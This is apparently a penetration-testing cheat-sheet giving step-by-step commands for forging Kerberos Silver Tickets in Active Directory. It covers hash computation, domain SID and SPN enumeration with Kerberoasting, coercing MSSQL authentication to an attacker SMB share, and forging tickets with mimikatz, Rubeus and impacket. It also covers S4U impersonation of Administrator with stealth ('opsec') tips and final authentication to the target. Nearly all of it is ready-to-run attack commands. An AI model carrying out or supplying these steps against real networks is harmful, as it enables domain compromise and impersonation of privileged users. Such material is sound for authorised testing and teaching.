# Silver Ticket

## Requirements:

### 1) SPN password NTLM hash 

https://www.browserling.com/tools/ntlm-hash

OR Use this Python one-liner instead

    python3 -c "from passlib.hash import nthash; print(nthash.hash('YourPassword'))"

Another one-liner

    echo -n 'YourPassword' | iconv -t UTF-16LE | openssl md4

### 2) Domain SID

Windows

    Get-ADDomain

Linux

    rpcclient -U "user.name" -c "lsaquery" IP

### 3) Target SPN (mssql/domain.local)

Windows

    Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames

Linux (Add -request to Kerberoast if needed)

    impacket-GetUserSPNs domain.local/user.name:Spring2023 -dc-ip IP

### 4) Kerberos modules installed on your machine

    sudo apt install krb5user

## Steps:

### 1) Verify if the service you are authenticated runs in the context of the service user. If yes, you can impersonate the administrator!

Create a share directory

    mkdir share

Run your SMB Server

    impacket-smbserver share share -smb2support

Try to authenticate to your SMB Server, then check for verification

    exec xp_dirtree '\\SMB_SERVER_IP\share' (MSSQL Server example)
    net shares '\\SMB_SERVER_IP\share'

### 2) Create ST

/rc4 take the service account (generally the machine account) hash. /aes128 or /aes256 can be used for AES keys.

    Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:<domain_SID> /target:<target>.domain.local /service:CIFS /rc4:<account_hash> /ptt"'

Requesting a ST with a valid TGT can be performed with Rubeus like this:

    .\Rubeus.exe asktgs /ticket:tgt.kirbi /service:LDAP/dc.domain.local,cifs/dc.domain.local /ptt

Another solution, if you don't have the NT hash or the AES keys of the service but you have a TGT for the service account, is to impersonate an account via a request for a service ticket through S4USelf to an alternative service (and the opsec is better since the PAC is consistent):

    .\Rubeus.exe s4u /self /impersonateuser:"Administrator" /altservice:"cifs/target.domain.local" /ticket:"<base64_target_TGT>" /nowrap

## Linux

    ticketer.py -domain domain.local -domain-sid <domain_SID> -spn 'cifs/target' -nthash <account_hash> -user-id <target_RID> -duration <ticket_lifetime_in_day> <target_user>

Another solution, if you don't have the NT hash or the AES keys of the service but you have a TGT for the service account, is to impersonate an account via a request for a service ticket through S4USelf to an alternative service (and the opsec is better since the PAC is consistent):

    export KRB5CCNAME=./target_TGT.ccache
    getST.py -self -impersonate "Administrator" -altservice "cifs/target.domain.local" -k -no-pass "domain.local"/'target$'

MISC

    impacket-ticketer -nthash MACHINE_NT_HASH -domain-sid DOMAIN_SID -domain DOMAIN ANY_USER

    mimikatz "kerberos::golden /sid:CURRENT_USER_SID /domain:DOMAIN_SID /target:TARGET_SERVER /service:TARGET_SERVICE /aes256:COMPUTER_AES256_KEY /user:ANY_USER /ptt"

### 3) After crafting your ST, export the ccache file into krb5ccname

    export KRB5CCNAME=Administrator.ccache

### 4) Adjust the krb5.conf by adding the target domain and realm by adding them as new entries with the corresponding format

    [realms]
        DOMAIN.LOCAL = {
        kdc = domain.domain.local
        }

    [domain_realm]
        .domain.local = DOMAIN.LOCAL

#### TIP: If you have access to a service (MSSQL, for example) via port forward, DO NOT FORGET to set an extra /etc/hosts file entry with localhost

    #192.168.1.45 domain.local    domain.domain.local
    127.0.0.1    domain.local    domain.domain.local

### 5) Authenticate with your crafted Silver Ticket

    impacket-mssql -k domain.domain.local
